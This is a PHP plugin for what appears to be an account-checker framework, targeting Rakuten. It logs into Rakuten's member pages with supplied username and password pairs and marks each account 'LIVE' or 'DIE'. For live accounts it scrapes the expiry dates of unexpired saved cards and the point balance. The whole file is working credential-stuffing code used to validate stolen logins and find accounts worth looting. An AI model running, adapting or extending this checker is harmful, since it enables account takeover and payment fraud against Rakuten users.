<?php
class check_rakuten extends plugins {
	public $id = "rakuten";
	public $name = "Check rakuten";
	public $version = "1.0.0";
	public $descrition = "Check rakuten acc, points and credit cards";
	
	public $fields = array(
		"status" => "str",
		"cards" => "str",
		"point" => "int",
	);
	
	public function check($user,$pass,$request) {
		return $this->runCheck($user,$pass,isset($request['cards']),isset($request['point']));
	}
	
	private function runCheck($m,$p,$check_card=false,$check_point=false) {
		// delete old cookie
		$this->startSession();
		
		$return = array();
		
		$ref = "https://member.id.rakuten.co.jp/rms/nid/menufwd?scid=wi_gmx_myr_up_reg";
		$this->connect($ref);
		
		// check
		$data = array('u'=>$m,'p'=>$p,
			'scid' => 'wi_gmx_myr_up_reg',
			'submit' => 'Login'
		);
		$url = 'https://member.id.rakuten.co.jp/rms/nid/loginmember';
		
		if (!preg_match('/Set\-cookie: Ib=/i',$this->connect($url,$ref,$data))) {
			$return['status'] = "DIE";
			return $return;
		}
		
		if ($check_card) {
			$url = "https://member.id.rakuten.co.jp/rms/nid/mpaymentfwd1";
			$ref = 'https://member.id.rakuten.co.jp/rms/nid/menufwd';			
			$r = array();
			$mon = intval(date('n'));
			$y = intval(date('Y'));
			if (preg_match_all('/(20[0-9][0-9])\/([0-9][0-9])/',$this->connect($url,$ref),$match,PREG_SET_ORDER)) {
				foreach ($match as $m) {
					if ($m[1]>$y||($m[1]==$y&&$m[2]>=$mon)) $r[] = $m[0];
				}
			}
			
			$return['cards'] = implode(",",$r);
		}
		
		if ($check_point) {
			if (preg_match('/総保有ポイント<\/dt>\s*<dd>([0-9,]*)<\/dd>/',$this->connect("https://point.rakuten.co.jp/"),$match)) {
				$return['point'] = str_replace(",","",$match[1]);
			} else {
				$return['point'] = -1;
			}
		}
		
		// delete cookie
		$this->endSession();
		
		$return['status'] = "LIVE";	
		return $return;
	}

}
?>